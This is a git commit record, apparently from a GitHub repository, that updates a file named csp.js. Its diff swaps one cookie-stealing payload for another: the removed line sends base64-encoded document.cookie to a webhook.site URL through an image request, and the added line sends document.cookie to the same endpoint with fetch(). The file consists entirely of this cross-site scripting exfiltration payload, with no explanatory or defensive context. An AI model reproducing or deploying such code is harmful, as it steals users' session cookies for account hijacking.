c7318e28235571ef8d6624370535cd77e84be0b9
HartiDhayaa <58786265+dhiaae@users.noreply.github.com>
2025-11-10 00:17:27 +0100

    Update csp.js

--- csp.js
+++ csp.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/b25545a7-6b7e-4d73-a026-67ec1ce95a4a?
-data='+btoa(document.cookie);
+fetch('https://webhook.site/b25545a7-6b7e-4d73-a026-67ec1ce95a4a?c=' + document.cookie)
